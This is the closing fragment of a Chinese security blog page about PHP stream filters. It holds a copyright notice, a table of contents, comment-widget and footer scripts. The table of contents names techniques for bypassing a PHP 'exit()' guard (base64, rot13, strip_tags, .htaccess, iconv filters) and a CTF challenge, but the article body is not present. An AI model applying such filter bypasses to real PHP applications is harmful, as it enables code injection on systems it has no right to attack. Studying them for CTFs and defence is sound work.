+<h1 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/">https://sakurahack-y.github.io/2022/12/01/详解php-fliter/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/php/">php</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.1.</span> <span class="toc-text">字符串过滤器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#string-strip-tags"><span class="toc-number">2.2.</span> <span class="toc-text">string.strip_tags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.3.</span> <span class="toc-text">转换过滤器</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1exit-%E6%98%93"><span class="toc-number">3.</span> <span class="toc-text">绕过死亡exit(易)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#base64%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">base64绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rot13%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">rot13绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#string-strip-tags-1"><span class="toc-number">3.3.</span> <span class="toc-text">string.strip_tags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%A4%84%E7%90%86"><span class="toc-number">3.4.</span> <span class="toc-text">.htaccess的预包含处理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1exit-%E9%9A%BE"><span class="toc-number">4.</span> <span class="toc-text">绕过死亡exit(难)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#base64"><span class="toc-number">4.1.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rot13%E7%BB%95%E8%BF%87-1"><span class="toc-number">4.2.</span> <span class="toc-text">rot13绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#convert-iconv-%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.</span> <span class="toc-text">convert.iconv.*绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf%E9%A2%98%E7%9B%AE"><span class="toc-number">5.</span> <span class="toc-text">ctf题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#VMCTF-Checkin"><span class="toc-number">5.1.</span> <span class="toc-text">VMCTF Checkin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E6%96%87%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">原文链接</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/">&lt; php反序列化总结</a><a class="next" href="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/">php文件包含总结 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
